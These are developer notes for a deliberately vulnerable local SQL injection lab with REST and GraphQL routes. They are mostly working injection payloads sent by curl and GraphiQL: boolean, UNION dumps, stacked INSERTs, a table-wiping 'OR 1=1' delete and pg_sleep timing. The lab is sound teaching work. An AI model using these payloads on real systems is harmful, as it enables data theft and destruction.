# Backend Dev Notes

Working notes on container management, database access, API usage, and SQL injection exploit examples.

---

## Container Management

Build and run the backend container locally (without Compose):

```bash
docker rm -f sqlinj-backend
docker build -t sqlinj-backend:dev .
docker run --rm -it --name sqlinj-backend --env-file .env -p 5001:5001 sqlinj-backend:dev
```

Pull and run from GHCR (pipeline-built image):

```bash
docker pull --platform linux/amd64 ghcr.io/igorgroz/sqlinj-backend:latest
docker run --rm -it --platform linux/amd64 --env-file .env -p 5001:5001 ghcr.io/igorgroz/sqlinj-backend:latest
```

---

## Database Access

Connect to the containerised Postgres instance:

```bash
docker exec -it sqlinj-db psql -U sql_lab_user -d sqlinjproject
```

Useful psql commands:

```sql
\dt                          -- list tables
SELECT * FROM users;
SELECT * FROM clothes;
SELECT * FROM user_clothes;
```

### Reference Data

**users**

| userid | name    | surname  |
|--------|---------|----------|
| 1      | John    | Doe      |
| 2      | Jane    | Smith    |
| 3      | Alice   | Johnson  |
| 4      | Bob     | Brown    |
| 5      | Charlie | Williams |

**clothes**

| clothid | description | color | brand  | size     | material  |
|---------|-------------|-------|--------|----------|-----------|
| 1       | T-Shirt     | Red   | Nike   | M        | Cotton    |
| 2       | Jeans       | Blue  | Levis  | 32       | Denim     |
| 3       | Jacket      | Black | Adidas | L        | Polyester |
| 4       | Sweater     | Green | Uniqlo | M        | Wool      |
| 5       | Hat         | Black | Puma   | One Size | Cotton    |
| 6       | Scarf       | Red   | Gucci  | One Size | Silk      |
| 7       | Shoes       | White | Adidas | 9        | Leather   |
| 8       | Socks       | Gray  | H&M    | M        | Cotton    |
| 9       | Sneakers    | White | Nike   | 10       | Leather   |
| 10      | Shorts      | Black | Zara   | M        | Polyester |

> Legacy: AWS RDS endpoint was `sqlinjproject-db.cymhse7fxmp9.ap-southeast-2.rds.amazonaws.com` — decommissioned, using containerised Postgres only.

---

## REST API Endpoints

All routes served from `http://localhost:5001`. Full interactive docs at `/api-docs`.

### Insecure Routes (SQL injection targets)

| Method | Endpoint                          | Vulnerability                                      |
|--------|-----------------------------------|----------------------------------------------------|
| GET    | `/api/insecure-users`             | String interpolation in query                      |
| GET    | `/api/insecure-users/:userid`     | userid injected directly into SQL                  |
| GET    | `/users/:userid/clothes`          | userid injected directly into SQL                  |
| POST   | `/users/:userid/clothes`          | userid + clothid injected directly                 |
| PUT    | `/users/:userid/clothes/:clothid` | userid, clothid, newClothid injected directly      |
| DELETE | `/users/:userid/clothes/:clothid` | userid + clothid injected directly                 |

### Secure Routes (parameterised queries)

| Method | Endpoint                               | Protection                      |
|--------|----------------------------------------|---------------------------------|
| GET    | `/api/safe-users`                      | Parameterised query             |
| GET    | `/api/safe-users/:userid`              | Parameterised query             |
| GET    | `/users/:userid/safe-clothes`          | `$1` placeholder                |
| POST   | `/users/:userid/safe-clothes`          | Parameterised insert            |
| PUT    | `/users/:userid/safe-clothes/:clothid` | Parameterised update            |
| DELETE | `/users/:userid/safe-clothes/:clothid` | Parameterised delete            |

---

## SQL Injection Exploit Examples

### Injection context reference — REST

| Route | Interpolated SQL fragment | userid ctx | clothid ctx |
|-------|--------------------------|------------|-------------|
| `GET /api/insecure-users/:userid` | `WHERE userid = ${userid}` | integer | — |
| `GET /api/insecure-users/:userid/clothes` | `WHERE uc.userid = ${userid}` | integer | — |
| `POST /api/insecure-users/clothes` | `VALUES (${userid}, ${clothid})` | integer | integer |
| `POST /api/insecure-users/remove-cloth` | `WHERE userid = ${userid} AND clothid = ${clothid}` | integer | integer |

### Injection context reference — GraphQL (`/graphql-insecure`)

| Mutation | Interpolated SQL fragment | userid ctx | clothid ctx |
|----------|--------------------------|------------|-------------|
| `addInsecureCloth` | `VALUES (${userid}, '${clothid}')` | integer | **string** |
| `removeInsecureCloth` | `WHERE userid = ${userid} AND clothid = ${clothid}` | integer | integer |

`addInsecureCloth` is the **only route** with a string-context parameter.
`clothid` sits inside `'...'` in the SQL — the `'` break applies there and
nowhere else in the app.

---

## Exploiting Anonymous Insecure REST Pages

### Add Cloth

> Note: ensure the cloth ID is not already assigned to the user — a duplicate key error will be returned.

**Curl / Postman**
```bash
curl -s -X POST http://localhost:5001/api/insecure-users/clothes \
  -H "Content-Type: application/json" \
  -d '{"userid":"5","clothid":"9); INSERT INTO users(name,surname) VALUES('"'"'Alex'"'"','"'"'Injected'"'"'); --"}'
```

**GUI** — navigate to the insecure user detail page, paste into the **Add Cloth** field:
```
9); INSERT INTO users(name,surname) VALUES('Alex','Injected'); --
```

---

### Remove Cloth

> Note: userid comes from the URL. Only the cloth ID field is injectable.

**Curl / Postman**
```bash
curl -s -X POST http://localhost:5001/api/insecure-users/remove-cloth \
  -H "Content-Type: application/json" \
  -d '{"userid":"1","clothid":"1; INSERT INTO users(name,surname) VALUES('"'"'Alex'"'"','"'"'Injected'"'"'); --"}'
```

**GUI** — paste into the **Remove Cloth** field:
```
1; INSERT INTO users(name,surname) VALUES('Alex','Injected'); --
```

---

## Exploiting Insecure GraphQL Page (`/graphql-insecure`)

### Add Cloth — clothid is string context (`'${clothid}'` in SQL)

> This is the only string-context injection in the app — break with `'`, not `)`.

**Curl / Postman**
```bash
curl -s -X POST http://localhost:5001/graphql-insecure \
  -H "Content-Type: application/json" \
  -d '{"query":"mutation { addInsecureCloth(userid: 5, clothid: \"9'"'"'); INSERT INTO users(name,surname) VALUES('"'"'Alex'"'"','"'"'Injected'"'"'); --\") }"}'
```

**GUI** — navigate to the insecure GraphQL user page, paste into the **Add Cloth** field:
```
9'); INSERT INTO users(name,surname) VALUES('Alex','Injected'); --
```

---

### Remove Cloth — both parameters are integer context

**Curl / Postman**
```bash
curl -s -X POST http://localhost:5001/graphql-insecure \
  -H "Content-Type: application/json" \
  -d '{"query":"mutation { removeInsecureCloth(userid: 1, clothid: \"1; INSERT INTO users(name,surname) VALUES('"'"'Alex'"'"','"'"'Injected'"'"'); --\") }"}'
```

**GUI** — paste into the **Remove Cloth** field:
```
1; INSERT INTO users(name,surname) VALUES('Alex','Injected'); --
```

---

### Verify

```bash
docker exec -it sqlinj-db psql -U sql_lab_user -d sqlinjproject \
  -c "SELECT * FROM users ORDER BY userid;"
```

Reset: `docker compose down -v && docker compose up -d`

---

### 1 — Boolean-based (manipulate WHERE to widen result set)

```bash
# GET /insecure-users/:userid  →  WHERE userid = 1 OR 1=1  →  returns ALL users
curl -g "http://localhost:5001/api/insecure-users/1%20OR%201=1"

# GET /insecure-users/:userid/clothes  →  WHERE uc.userid = 1 OR 1=1  →  ALL clothes
curl -g "http://localhost:5001/api/insecure-users/1%20OR%201=1/clothes"

# POST remove-cloth  →  DELETE WHERE userid=1 AND clothid=1 OR 1=1  →  WIPES TABLE
curl -s -X POST http://localhost:5001/api/insecure-users/remove-cloth \
  -H "Content-Type: application/json" \
  -d '{"userid":"1","clothid":"1 OR 1=1"}'
```

---

### 2 — UNION-based (extract data from other tables)

`users` has 3 columns (userid INT, name TEXT, surname TEXT).
`clothes` has 6 columns (clothid INT, description, color, brand, size, material).

```bash
# Dump version via /insecure-users  (3-col UNION, userid=0 ensures no real row)
curl -g "http://localhost:5001/api/insecure-users/0%20UNION%20SELECT%201,version(),'x'--"

# Dump all usernames via /insecure-users
curl -g "http://localhost:5001/api/insecure-users/0%20UNION%20SELECT%20userid,name,surname%20FROM%20users--"

# Dump users table via /insecure-users/:userid/clothes  (must match 6 cols)
# Maps:  clothid←userid, description←name, color←surname, rest padded
curl -g "http://localhost:5001/api/insecure-users/0%20UNION%20SELECT%20userid,name,surname,name,surname,'x'%20FROM%20users--/clothes"

# Enumerate tables via information_schema
curl -g "http://localhost:5001/api/insecure-users/0%20UNION%20SELECT%201,table_name,'x'%20FROM%20information_schema.tables%20WHERE%20table_schema='public'--"
```

---

### 3 — Stacked queries — INSERT INTO users (showcase)

`pool.query()` uses PostgreSQL simple-query protocol — multiple statements
separated by `;` are all executed. Each example below inserts a new row into
`users` to give a concrete, verifiable result.

```bash
# ── GET /insecure-users/:userid ───────────────────────────────────────────────
# SQL: SELECT * FROM users WHERE userid = 1; INSERT INTO users... --
curl -g "http://localhost:5001/api/insecure-users/1%3B%20INSERT%20INTO%20users(name,surname)%20VALUES('Alex1','REST_GET')--"

# ── GET /insecure-users/:userid/clothes ──────────────────────────────────────
# SQL: WHERE uc.userid = 1; INSERT INTO users... --
curl -g "http://localhost:5001/api/insecure-users/1%3B%20INSERT%20INTO%20users(name,surname)%20VALUES('Alex2','REST_GET_clothes')--/clothes"

# ── POST /api/insecure-users/clothes  (via clothid, integer context) ─────────
# clothid payload closes VALUES() then stacks INSERT
# SQL: INSERT INTO user_clothes ... VALUES (5, 9); INSERT INTO users... --
curl -s -X POST http://localhost:5001/api/insecure-users/clothes \
  -H "Content-Type: application/json" \
  $'{"userid":"5","clothid":"9); INSERT INTO users(name,surname) VALUES(\'Alex3\',\'REST_POST_clothes\'); --"}'

# ── POST /api/insecure-users/remove-cloth  (via clothid, integer context) ────
# SQL: DELETE FROM user_clothes WHERE userid=1 AND clothid=1; INSERT INTO users... --
curl -s -X POST http://localhost:5001/api/insecure-users/remove-cloth \
  -H "Content-Type: application/json" \
  $'{"userid":"1","clothid":"1; INSERT INTO users(name,surname) VALUES(\'Alex4\',\'REST_POST_remove\'); --"}'
```

Verify all four injections landed:

```bash
docker exec -it sqlinj-db psql -U sql_lab_user -d sqlinjproject \
  -c "SELECT * FROM users ORDER BY userid;"
# Seed rows: userid 1–5.  Injected rows: Alex1–Alex4 appended.
```

---

### 4 — Time-based blind (confirm injection without visible output)

```bash
# 3-second delay confirms code execution even with no data returned
curl -g -w "\nTotal time: %{time_total}s\n" \
  "http://localhost:5001/api/insecure-users/1%3B%20SELECT%20pg_sleep(3)--"

# Via POST body (cleaner, no URL encoding needed)
curl -s -X POST http://localhost:5001/api/insecure-users/remove-cloth \
  -H "Content-Type: application/json" \
  -d '{"userid":"1","clothid":"1; SELECT pg_sleep(3); --"}' \
  -w "\nTotal time: %{time_total}s\n"
```

---

### Verify injections in the database

```bash
docker exec -it sqlinj-db psql -U sql_lab_user -d sqlinjproject -c "SELECT * FROM users;"
docker exec -it sqlinj-db psql -U sql_lab_user -d sqlinjproject -c "SELECT * FROM user_clothes;"
```

Injected rows appear alongside the 5 seed users.
To reset to a clean state: `docker compose down -v && docker compose up -d`

---

## GraphQL Endpoints

| Endpoint             | Auth required | Notes                        |
|----------------------|---------------|------------------------------|
| `/graphql`           | No            | Apollo v4, standard          |
| `/graphql-insecure`  | No            | Vulnerable resolver          |
| `/graphql-secure`    | Yes (JWT)     | requireJwt middleware        |

GraphiQL playground: `http://localhost:5001/graphql-insecure`

---

## GraphQL Injection Exploit Examples

All mutations sent as POST to `http://localhost:5001/graphql-insecure`.

### `addInsecureCloth` — clothid is STRING context

SQL: `` INSERT INTO user_clothes (userid, clothid) VALUES (${userid}, '${clothid}') ``

`clothid` sits inside single quotes → break with `'`. This is the **only**
string-context injection point in the app. `userid` is still bare integer.

```bash
# ── Via clothid (string context) — ' break ───────────────────────────────────
# SQL: INSERT INTO user_clothes VALUES (5, '9');
#      INSERT INTO users(name,surname) VALUES('Alex5','GQL_clothid'); --')
curl -s -X POST http://localhost:5001/graphql-insecure \
  -H "Content-Type: application/json" \
  $'{"query":"mutation { addInsecureCloth(userid: \\"5\\", clothid: \\"9\'); INSERT INTO users(name,surname) VALUES(\'Alex5\',\'GQL_clothid\'); --\\") }"}'

# ── Via userid (integer context) — ) break ───────────────────────────────────
# SQL: INSERT INTO user_clothes VALUES (5, 9);
#      INSERT INTO users(name,surname) VALUES('Alex6','GQL_userid'); --', '9')
curl -s -X POST http://localhost:5001/graphql-insecure \
  -H "Content-Type: application/json" \
  $'{"query":"mutation { addInsecureCloth(userid: \\"5, 9); INSERT INTO users(name,surname) VALUES(\'Alex6\',\'GQL_userid\'); --\\", clothid: \\"9\\") }"}'
```

GraphiQL (`http://localhost:5001/graphql-insecure`) — paste directly:

```graphql
# clothid — string context (' break)
mutation {
  addInsecureCloth(
    userid: "5"
    clothid: "9'); INSERT INTO users(name,surname) VALUES('Alex5','GQL_clothid'); --"
  )
}

# userid — integer context () break)
mutation {
  addInsecureCloth(
    userid: "5, 9); INSERT INTO users(name,surname) VALUES('Alex6','GQL_userid'); --"
    clothid: "9"
  )
}
```

---

### `removeInsecureCloth` — both integer context

SQL: `` DELETE FROM user_clothes WHERE userid = ${userid} AND clothid = ${clothid} ``

Both parameters are bare integers — same techniques as the REST remove-cloth route.

```bash
# ── Stacked INSERT via clothid ────────────────────────────────────────────────
# SQL: DELETE FROM user_clothes WHERE userid=1 AND clothid=1;
#      INSERT INTO users(name,surname) VALUES('Alex7','GQL_remove'); --
curl -s -X POST http://localhost:5001/graphql-insecure \
  -H "Content-Type: application/json" \
  $'{"query":"mutation { removeInsecureCloth(userid: \\"1\\", clothid: \\"1; INSERT INTO users(name,surname) VALUES(\'Alex7\',\'GQL_remove\'); --\\") }"}'

# ── Time-based blind ──────────────────────────────────────────────────────────
curl -s -X POST http://localhost:5001/graphql-insecure \
  -H "Content-Type: application/json" \
  -d '{"query":"mutation { removeInsecureCloth(userid: \"1\", clothid: \"1; SELECT pg_sleep(3); --\") }"}' \
  -w "\nTotal time: %{time_total}s\n"
```

GraphiQL:

```graphql
# Stacked INSERT (showcase)
mutation {
  removeInsecureCloth(userid: "1", clothid: "1; INSERT INTO users(name,surname) VALUES('Alex7','GQL_remove'); --")
}

# Time-based blind
mutation {
  removeInsecureCloth(userid: "1", clothid: "1; SELECT pg_sleep(3); --")
}
```

---

### Operator precedence gotcha — `AND` vs `OR`

In `DELETE ... WHERE userid = 1 AND clothid = 1 OR 1=1`:
- `AND` binds tighter than `OR`
- Evaluates as: `(userid = 1 AND clothid = 1) OR (1=1)`
- `1=1` is always true → entire table deleted

To delete only one user's rows, use: `clothid = "1 OR userid = 999"` — still
deletes nothing real but confirms injection. For targeted deletion: no injection
needed, that's what the normal route is for.

---

### Verify all injections

```bash
docker exec -it sqlinj-db psql -U sql_lab_user -d sqlinjproject \
  -c "SELECT * FROM users ORDER BY userid;"
```

Expected after running all 7 examples:

| userid | name  | surname          |
|--------|-------|------------------|
| 1–5    | (seed data)      |
| …      | Alex1 | REST_GET         |
| …      | Alex2 | REST_GET_clothes |
| …      | Alex3 | REST_POST_clothes|
| …      | Alex4 | REST_POST_remove |
| …      | Alex5 | GQL_clothid      |
| …      | Alex6 | GQL_userid       |
| …      | Alex7 | GQL_remove       |

Reset to clean state: `docker compose down -v && docker compose up -d`
